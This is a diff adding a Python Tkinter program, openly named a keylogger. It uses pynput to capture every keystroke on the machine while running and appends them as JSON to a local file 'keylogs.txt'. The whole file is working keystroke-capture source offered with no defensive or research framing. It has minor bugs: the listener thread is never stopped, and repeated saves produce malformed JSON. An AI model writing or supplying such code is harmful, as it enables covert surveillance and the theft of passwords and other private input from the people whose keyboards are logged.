@@ -1,0 +1,48 @@
+import json
+import threading
+import tkinter as tk
+from pynput.keyboard import Listener
+
+class KeyloggerGUI:
+    def __init__(self, master):
+        self.master = master
+        master.title("Keylogger")
+
+        self.start_button = tk.Button(master, text="Start keylogger", command=self.start_keylogger)
+        self.start_button.pack()
+
+        self.stop_button = tk.Button(master, text="Stop keylogger", command=self.stop_keylogger, state=tk.DISABLED)
+        self.stop_button.pack()
+
+        self.is_logging = False
+        self.logged_keys = []
+
+    def start_keylogger(self):
+        self.is_logging = True
+        self.start_button.config(state=tk.DISABLED)
+        self.stop_button.config(state=tk.NORMAL)
+        
+        threading.Thread(target=self.start_listener).start()
+
+    def stop_keylogger(self):
+        self.is_logging = False
+        self.start_button.config(state=tk.NORMAL)
+        self.stop_button.config(state=tk.DISABLED)
+
+        self.save_logs()
+
+    def start_listener(self):
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+    def on_press(self, key):
+        if self.is_logging:
+            self.logged_keys.append(str(key))
+
+    def save_logs(self):
+        with open("keylogs.txt", "a") as f:
+            json.dump(self.logged_keys, f)
+
+root = tk.Tk()
+keylogger_gui = KeyloggerGUI(root)
+root.mainloop()
